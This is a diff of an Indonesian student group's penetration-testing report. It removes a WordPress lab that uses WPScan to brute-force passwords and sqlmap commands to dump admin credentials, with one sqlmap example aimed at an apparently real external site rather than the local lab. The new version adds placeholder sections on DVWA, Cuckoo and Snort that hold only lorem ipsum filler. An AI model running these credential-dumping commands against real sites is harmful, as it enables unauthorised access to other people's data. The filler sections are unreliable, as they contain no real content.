@@ -1,4 +1,4 @@
-# Anggota Kelompok
+# Anggota Kelompok 9
 
 1. 5114100031 ANDRE EXAUDI JEREMY RUMAPEA
 2. 5114100043 JEFFRY NASRI FARUKI
@@ -8,183 +8,70 @@
 
 Dalam laporan ini akan dilakukan uji penetrasi  terhadap server. Dalam praktiknya Kami menggunakan os ubuntu-14.04.5-server-i386 sebagai server dan dan os ubuntu-17.04-dekstop sepagai penyerang. tools yang kami pakai dalam uji coba adalah hydra dan ncrack. Dalam laporan ini akan dilakukan 2 kali uji coba penetrasi, dimana yang pertama virtual server hanya terinstall openssh . Yang kedua viertual server terinstall openssh dan fail2ban
 
-# Dasar teori
+# DVWA
+## Konfigurasi
 
-## OS Ubuntu Dekstop
-Ubuntu adalah salah satu distribusi Linux yang berbasiskan pada Debian dan memiliki interface desktop. Proyek Ubuntu disponsori oleh Canonical Ltd (perusahaan milik Mark Shuttleworth). Kami menggunakan os ubuntu server versi 16.04-dekstop
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-## Tools Wordpress
+## Testing
+### Lesson 4: Using Metasploit with Command Execution
 
-WordPress adalah sebuah aplikasi sumber terbuka (open source) yang sangat populer digunakan sebagai mesin blog (blog engine). WordPress dibangun dengan bahasa pemrograman PHP dan basis data (database) MySQL. PHP dan MySQL, keduanya merupakan perangkat lunak sumber terbuka (open source software). Selain sebagai blog, WordPress juga mulai digunakan sebagai sebuah CMS (Content Management System) karena kemampuannya untuk dimodifikasi dan disesuaikan dengan kebutuhan penggunanya. WordPress adalah penerus resmi dari b2/cafelog yang dikembangkan oleh Michel Valdrighi. Nama WordPress diusulkan oleh Christine Selleck, teman Matt Mullenweg. WordPress saat ini menjadi platform content management system (CMS) bagi beberapa situs web ternama seperti CNN, Reuters, The New York Times, TechCrunch, dan lainnya .
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
+### Lesson 5: Using Tamper Data with crack_web_form.pl
 
-## Plugin Video Player
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-Video player adalah plugin video WordPress yang memungkinkan Anda menambahkan video ke situs web dengan mudah. Ini memiliki kemungkinan untuk mengatur video menjadi daftar putar dan memilih tata letak pilihan untuk pemain
+### Lesson 6: Manual SQL Injection, John the Ripper
 
-## Plugin League Manager
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-League manager adalah Plugin yangdirancang untuk mengelola liga olahraga dan menampilkannya di blog Anda.
+### Lesson 7: Automate SQL Injection with SqlMap
 
-## Tools SQLMap
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-Sqlmap adalah alat pengujian penetrasi open source yang mengotomatisasi proses mendeteksi dan mengeksploitasi kelemahan SQL injection dan mengambil alih dari database server. Muncul dengan mesin deteksi yang kuat, banyak fitur ceruk untuk penetrasi tester utama dan berbagai switch yang berlangsung dari database sidik jari, atas data mengambil dari database, untuk mengakses sistem file yang mendasari dan mengeksekusi perintah pada sistem operasi melalui out of-band koneksi.
+### Lesson 8: Upload PHP Backdoor Payload
 
-## Tools WPScan
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-WPScan adalah scanner keamanan yang memeriksa keamanan WordPress menggunakan metode “black box”.WpScan ini ditulis dengan bahasa ruby.
+### Lesson 9: Cross Site Scripting (XSS)
 
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
+### Lesson 10: Cross Site Request Forgery combined with Curl
 
-# Uji penetrasi SQL Injection
-## Langkah instalasi wordpress dan Vulnerable Plugin
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-1. Buka terminal
-2. Install LAMP dengan cara mengetikkan perintah berikut :
-```
-sudo apt-get install apache2 mysql-server php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd
-```
-3. Buat sebuah database di mysql yang digunakan sebagai database wordpress. dengan mengetikkan perintah berikut :
-```
-mysql -u root -p;
-CREATE DATABASE wordpress;
-GRANT ALL ON wordpress.* TO 'root'@'localhost' IDENTIFIED BY 'root';
-FLUSH PRIVILEGES;
-EXIT;
-```
-3. Unduh wordpress tarball di http://wordpress.org/latest.tar.gz
-4. Ekstrak file ke direktori /var/www/html dengan mengetikkan perintah 
-```
-sudo tar -xvzf wordpress-4.8.3.tar.gz -C /var/www/html
-```
-5. Buka Browser dan ketikkan :
+# CUCKOO
+## Instalasi
 
-http://localhost/wordpress/wp-admin/install.php
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-6. Ikuti langkah-langkahnya
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/1-instalasi.PNG)
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/2-instalasi.PNG)
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/3-instalasi.PNG)
+## Konfigurasi
 
-7. Akan diminta unutk membuat file wp-config.php.Buat wp-config.php di /var/www/html
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-8. Ikuti langkah-langkah selanjutnya hingga selesai :
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/4-instalasi.PNG)
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/5-instalasi.PNG)
+## Testing
 
-9. Log in ke akun wordpress
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/6-instalasi.PNG)
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-10. Buka menu plugin dan klik tombol add new
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/7-instalasi.PNG)
+# SNORT
+## Instalasi
 
-11. Ketikkan video player dan league manager di kotak pencarian dan klik install untuk masing-masing
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/8-instalasi.PNG)
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/9-instalasi.PNG)
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-12. Jika muncul error terkait FTP tambahkan baris berikut di wp-config.php :
-```
-define('FSMETHOD', 'direct');
-```
-13. Jika muncul error terkait PERMISION , ketikkan perintah berikut di terminal :
-```
-sudo chown -R www-data:www-data  /var/www/html/wordpress
-find sudo /var/www/html -type d -exec chmod 755 {} \;
-find sudo /var/www/html -type f -exec chmod 644 {} \;
-```
-14. Jika plugin berhasil terinstall, tampilan akan menjadi seperti berikut :
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/11-instalasi.PNG)
+## Konfigurasi
 
-### Instalasi WPScan
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-1. Install git terlebih dahulu dengan perintah
-```
-sudo apt-get install git
-```
-2. Install prerequisites
-```
-sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev
-```
-3. Clone git main branch dari WPScan, kemudian masuk ke folder WPScan, dan masukkan perintah sebagai berikut(line 3)
-```
-git clone https://github.com/wpscanteam/wpscan.git
-cd wpscan
-sudo gem install bundler && bundle install --without test development
-```
-### Instalasi sqlmap
+## Testing
 
-1. Lakukan git clone dari repository sqlmap dan masuk ke folder sqlmap dengan perintah sebagai berikut
-```
-https://github.com/sqlmapproject/sqlmap.git
-cd sqlmap
-```
-2. Jalankan sqlmap dengan menggunakan python
-```
-python sqlmap.py
-```
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
-## Langkah Penetrasi SQL Injection
-### WPScan
-1. Lakukan perintah ini untuk melakukan pull terbaru dari git WPScan dan update database
-```
-git pull
-ruby wpscan.rb --update
-```
-2. Lakukan pengecekan plugin vulnerabilities plugin dari wordpress dengan perintah dibawah ini
-```
-ruby wpscan.rb --url http://yourwebsite.com --enumerate vp
-```
-Karena menggunakan localhost ganti http://yourwebsite.com dengan localhost/wordpress
+### membaca pcap dari SECREPO (Security Data Samples Repository)
 
-3. Berikut adalah hasil dari pengecekan tersebut
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/10-instalasi.PNG)
-
-4. Siapkan wordlist.txt yang berisi daftar-daftar password yang sering digunakan. file tersebut bisa dicari di internet. Taruh file tersebut di folder wp scan. Kemudian jalan perintah berikut :
-```
-ruby wpscan.rb --url http://localhost/wordpress --wordlist wordlist.txt threads 50
-```
-
-5. Jika selesai dijalnkan dan password ditemukan, tampilan di terminal menjadi seperti berikut :
-
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/12-instalasi.PNG)
-### SQLMap
-
-1. Jalankan perintah berikut di terminal untuk mengetahui type database yang digunakan:
-```
-python sqlmap.py -u "<Link yang akan diinject>"
-
-contoh :  python sqlmap.py -u "http://vacationet.com/resort.php?id=2"
-```
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/13-ujicoba.PNG)
-
-2. Untuk mengathui nama database, ketikkan perintah berikut :
-```
-python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbs
-```
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/14-ujicoba.PNG)
-
-3. Untuk mengetahui daftar tabel beserta kolomnya pada database , ketikkan perintah berikut :
-```
-python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbs --columns 
-```
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/15.1-ujicoba.PNG)
-
-Pilih nama tabel yang sekiranya menyimmpan username dan password
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/15.2-ujicoba.PNG)
-
-4. Jika sudah menemukan target tabel ketikkan perintah berikut unutuk melihat isi dari tabel tersebut :
-```
-python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbms mysql -D vacation -T config -C config_admin_pass,config_admin_user --dump
-```
-![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/16-ujicoba.PNG)
-# Kesimpulan dan Saran
-
-1. Terdapat beberapa plugin wordpress yang rentan dengan SQL injection
+"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
 
 # Refrensi
-  * https://id.wikipedia.org/wiki/WordPress
-  * https://ourgeeks.blogspot.co.id/2016/01/apa-itu-sqlmap.html
-  * https://rixzaldi.wordpress.com/2017/01/03/mencari-kelemahan-wordpress-site-dengan-wpscan/
-  * https://id.wordpress.org/plugins/player/
-  * https://wordpress.org/plugins/leaguemanager/
+  * http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB
   
